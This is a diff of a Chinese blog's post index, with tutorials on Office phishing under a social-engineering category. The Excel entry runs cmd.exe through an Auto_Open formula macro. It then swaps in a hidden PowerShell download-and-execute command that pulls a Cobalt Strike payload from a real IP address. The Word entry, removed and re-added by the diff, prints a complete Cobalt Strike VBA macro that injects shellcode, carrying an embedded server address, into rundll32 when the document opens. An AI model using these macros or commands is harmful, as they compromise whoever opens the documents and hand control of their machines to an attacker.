+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>分别在A1和A2输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=exec(&quot;c:\windows\system32\cmd.exe&quot;)</span><br><span class="line">=halt()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665296646193-cdded01b-6d69-4ba5-ad9e-42875fe1c19c.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">并将A1改为Auto_Open</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665296823093-4782b636-fc03-4270-8bc7-9ebd052cb943.png"></p>
+<h5 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h5><p>可能会报如下错误</p>
+<p><img src="/images/1665297307090-b503ddfe-6d8e-486f-982d-24798e81a2df.png"></p>
+<h5 id="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"><a href="#单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件" class="headerlink" title="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"></a>单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件</h5><p><img src="/images/1665297404810-b7af1740-237e-4371-b314-27ae5e4a5b7e.png"></p>
+<h5 id="成功执行系统命令"><a href="#成功执行系统命令" class="headerlink" title="成功执行系统命令"></a>成功执行系统命令</h5><p><img src="/images/1665297687638-e8787e4b-3a56-4594-8007-e6ec0e6723ab.png"></p>
+<h5 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h5><p>可以右键将其隐藏</p>
+<p><img src="/images/1665298061106-30f698ba-0e2f-4d9c-b5cc-e994062fe3b0.png"></p>
+<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>将系统命令替换为CS上线脚本即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://114.55.173.106:12888/a&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>这里由于excel中公式对单双引号的解析问题，直接贴上去无法执行</p>
+<h5 id="生成exe马"><a href="#生成exe马" class="headerlink" title="生成exe马"></a>生成exe马</h5><p><img src="/images/1665303573348-87529184-2027-4f7a-8c70-ac53c45d5db8.png"></p>
+<p><img src="/images/1665303670194-7cfad13b-5cc5-4c9b-8126-23d0417eae75.png"></p>
+<h5 id="打开文档即上线"><a href="#打开文档即上线" class="headerlink" title="打开文档即上线"></a>打开文档即上线</h5><p><img src="/images/1665303691884-961166e4-dc60-498f-a834-0b8873a8a097.png"></p>
 ]]></content>
       <categories>
         <category>社工</category>
@@ -2665,27 +2762,6 @@
 <h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>在添加压缩包时，勾选两个程序压缩，不要直接压缩文件夹</p>
 <p><img src="/images/1665318023941-7e45189b-7ce7-4048-b810-22cd73e705d4.png"></p>
 <p>否则找不到cs马程序，由于calc就存在于环境变量中，如果选中整个文件夹压缩，则只会弹出计算机</p>
-]]></content>
-      <categories>
-        <category>社工</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>word宏钓鱼(office)</title>
-    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/word%E5%AE%8F%E9%92%93%E9%B1%BC(office)/</url>
-    <content><![CDATA[<h2 id="在word选项中开启开发工具"><a href="#在word选项中开启开发工具" class="headerlink" title="在word选项中开启开发工具"></a>在word选项中开启开发工具</h2><p><img src="/images/1665293897653-48340ebf-6b7c-492e-9007-ca30f830d18f.png"></p>
-<p><img src="/images/1665293933408-6451566b-7701-449a-a4b6-5c549b170877.png"></p>
-<h2 id="打开宏"><a href="#打开宏" class="headerlink" title="打开宏"></a>打开宏</h2><p><img src="/images/1665294028952-3833e433-91a9-4cca-8079-9dafaab179e2.png"></p>
-<h2 id="Cobalt-Strike生成木马"><a href="#Cobalt-Strike生成木马" class="headerlink" title="Cobalt Strike生成木马"></a>Cobalt Strike生成木马</h2><p><img src="/images/1665294207495-ae047a08-4c43-4175-840d-8014db72527d.png"></p>
-<p><img src="/images/1665294244105-2ded9f7b-9ed4-4bea-8117-3168f994c6da.png"></p>
-<h5 id="cs宏木马"><a href="#cs宏木马" class="headerlink" title="cs宏木马"></a>cs宏木马</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,-66,47,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,105,53,107,83,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82, _</span><br><span class="line">45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80, _</span><br><span class="line">37,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,49,48,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,50,59,32,84,114,105,100,101,110,116,47,54,46,48,59,32,84, _</span><br><span class="line">111,117,99,104,41,13,10,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82, _</span><br><span class="line">45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80, _</span><br><span class="line">37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78, _</span><br><span class="line">84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52, _</span><br><span class="line">40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84, _</span><br><span class="line">45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,64,65,80,91,52,92,80,90,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,49,52,46,53,53,46,49,55,51,46,49,48,54,0,0,0,0,0)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
-
-<h2 id="新建宏"><a href="#新建宏" class="headerlink" title="新建宏"></a>新建宏</h2><p><img src="/images/1665295163943-5e1d2dc8-9da3-4be5-b0b1-7b3c4e96b6e6.png"></p>
-<h2 id="把CS生成的宏木马粘贴进去，保存"><a href="#把CS生成的宏木马粘贴进去，保存" class="headerlink" title="把CS生成的宏木马粘贴进去，保存"></a>把CS生成的宏木马粘贴进去，保存</h2><p><img src="/images/1665295205355-ffa67bf5-f5a5-4c21-938a-f672c9a9e30d.png"></p>
-<h2 id="再打开word发现成功上线"><a href="#再打开word发现成功上线" class="headerlink" title="再打开word发现成功上线"></a>再打开word发现成功上线</h2><p><img src="/images/1665295332033-89c74d16-186b-478d-a6de-0c10ba830bd9.png"></p>
-<p>注意，仅适用于office，wps打开没用</p>
-<h2 id="删除宏"><a href="#删除宏" class="headerlink" title="删除宏"></a>删除宏</h2><p><img src="/images/1665295729694-0edd64a9-937b-4983-8e15-b58386074fd4.png"></p>
-<p><img src="/images/1665295750277-409bb8c9-1ef0-4a9b-ad10-c4e2334bceb8.png"></p>
 ]]></content>
       <categories>
         <category>社工</category>
@@ -2943,6 +3019,27 @@
 <p>可以看到发件人变为我们自定义的</p>
 <p><img src="/images/1666362095958-d116546e-a3da-4b2c-87a7-897ed4f10a69.png"></p>
 <p>注意，可能是我之前用qq邮箱干过啥，不确定的邮件都发不进来，所以这里也需要将admin.com加入白名单域名</p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>word宏钓鱼(office)</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/word%E5%AE%8F%E9%92%93%E9%B1%BC(office)/</url>
+    <content><![CDATA[<h2 id="在word选项中开启开发工具"><a href="#在word选项中开启开发工具" class="headerlink" title="在word选项中开启开发工具"></a>在word选项中开启开发工具</h2><p><img src="/images/1665293897653-48340ebf-6b7c-492e-9007-ca30f830d18f.png"></p>
+<p><img src="/images/1665293933408-6451566b-7701-449a-a4b6-5c549b170877.png"></p>
+<h2 id="打开宏"><a href="#打开宏" class="headerlink" title="打开宏"></a>打开宏</h2><p><img src="/images/1665294028952-3833e433-91a9-4cca-8079-9dafaab179e2.png"></p>
+<h2 id="Cobalt-Strike生成木马"><a href="#Cobalt-Strike生成木马" class="headerlink" title="Cobalt Strike生成木马"></a>Cobalt Strike生成木马</h2><p><img src="/images/1665294207495-ae047a08-4c43-4175-840d-8014db72527d.png"></p>
+<p><img src="/images/1665294244105-2ded9f7b-9ed4-4bea-8117-3168f994c6da.png"></p>
+<h5 id="cs宏木马"><a href="#cs宏木马" class="headerlink" title="cs宏木马"></a>cs宏木马</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,-66,47,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,105,53,107,83,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82, _</span><br><span class="line">45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80, _</span><br><span class="line">37,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,49,48,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,50,59,32,84,114,105,100,101,110,116,47,54,46,48,59,32,84, _</span><br><span class="line">111,117,99,104,41,13,10,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82, _</span><br><span class="line">45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80, _</span><br><span class="line">37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78, _</span><br><span class="line">84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52, _</span><br><span class="line">40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84, _</span><br><span class="line">45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,64,65,80,91,52,92,80,90,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,49,52,46,53,53,46,49,55,51,46,49,48,54,0,0,0,0,0)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
+
+<h2 id="新建宏"><a href="#新建宏" class="headerlink" title="新建宏"></a>新建宏</h2><p><img src="/images/1665295163943-5e1d2dc8-9da3-4be5-b0b1-7b3c4e96b6e6.png"></p>
+<h2 id="把CS生成的宏木马粘贴进去，保存"><a href="#把CS生成的宏木马粘贴进去，保存" class="headerlink" title="把CS生成的宏木马粘贴进去，保存"></a>把CS生成的宏木马粘贴进去，保存</h2><p><img src="/images/1665295205355-ffa67bf5-f5a5-4c21-938a-f672c9a9e30d.png"></p>
+<h2 id="再打开word发现成功上线"><a href="#再打开word发现成功上线" class="headerlink" title="再打开word发现成功上线"></a>再打开word发现成功上线</h2><p><img src="/images/1665295332033-89c74d16-186b-478d-a6de-0c10ba830bd9.png"></p>
+<p>注意，仅适用于office，wps打开没用</p>
+<h2 id="删除宏"><a href="#删除宏" class="headerlink" title="删除宏"></a>删除宏</h2><p><img src="/images/1665295729694-0edd64a9-937b-4983-8e15-b58386074fd4.png"></p>
+<p><img src="/images/1665295750277-409bb8c9-1ef0-4a9b-ad10-c4e2334bceb8.png"></p>
 ]]></content>
       <categories>
         <category>社工</category>
